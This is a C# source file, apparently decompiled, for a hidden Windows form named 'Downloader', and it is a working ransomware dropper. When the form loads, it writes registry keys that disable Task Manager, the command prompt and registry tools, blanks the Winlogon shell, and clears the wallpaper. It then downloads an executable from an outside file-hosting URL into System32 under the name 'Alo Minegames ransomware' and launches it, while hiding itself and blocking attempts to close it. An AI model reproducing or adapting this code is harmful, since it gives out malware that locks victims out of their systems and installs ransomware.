using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Mionoho;

public class Downloader : Form
{
	private IContainer components = null;

	private Timer timer1;

	public Downloader()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void Downloader_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Downloader_Shown(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).Hide();
	}

	private void Downloader_Load(object sender, EventArgs e)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
		registryKey2.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
		registryKey3.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey4.SetValue("Shell", "empty", RegistryValueKind.String);
		RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey5.SetValue("Wallpaper", "", RegistryValueKind.String);
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://eu-west-1.ufile.io/get/f4hiv1pj?token=ZjExOGJlZmQ2NTc2OTRkYWE1YzljZWIxMWNmZThhOTBjMDNjYzg3MWEzN2FlZGE3NzZmODcwNjY1OGMxNjNkYTZkYzI1MGU2Mjk0NmE4NDQzY2ZkYzg3MTQ2NjgwZjc5YmMwYzM1MDNmYjllNWI5ZjU4MzlmMzZhY2UwYTZmYWNSSUoxWGRMajJGZmVQdlpKM05NZFliMUV0MDVjQ0FpOHd5bW9GYkdxdms2RGVqZk1Xci85SFpnU3BzRyt5M3MreEYzakNPb0o5Q2RnbXMxT0xoT2xiUkI2OFZHT3p0bE1FcXo4U0J1Ti9ua2lGRmhsNmlRV3RZTzkycGFpc3dXS2M0NFUvTzBaTGdwWDBlTWxWaHlrZS9tQmZoMDZQWmRjUTk3NjNYS2FJQzJqV21NcHFvRHNYQ25Wcnhka3ppbVV1dWZkTjFLdlp2aXI1TmYzRWJWZUZiTzB6cnducUFCZ1NxbEZyQWFqKytBPQ==", "C:\\Windows\\System32\\Alo Minegames ransomware.exe");
		Process.Start("C:\\Windows\\System32\\Alo Minegames ransomware");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(213, 186));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Downloader");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Downloadder");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Downloader_FormClosing));
		((Form)this).add_Load((EventHandler)Downloader_Load);
		((Form)this).add_Shown((EventHandler)Downloader_Shown);
		((Control)this).ResumeLayout(false);
	}
}
